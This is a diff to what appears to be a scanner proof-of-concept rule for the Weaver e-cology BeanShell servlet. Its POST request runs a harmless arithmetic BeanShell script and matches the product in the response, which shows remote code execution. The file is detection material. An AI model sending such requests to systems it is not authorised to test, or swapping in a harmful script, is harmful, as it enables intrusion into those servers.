@@ -3,10 +3,10 @@ rules:
   - method: POST
     path: /weaver/bsh.servlet.BshServlet
     body: >-
-      bsh.script=print%28%22ecology_rce_test%22%29%3B%0D%0A&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+      bsh.script=print%286311*2992%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
     follow_redirects: false
     expression: |
-      status==200 && body.bcontains(b'ecology_rce_test')
+      status==200 && body.bcontains(b'18882512')
 detail:
   author: l1nk3r
   links:
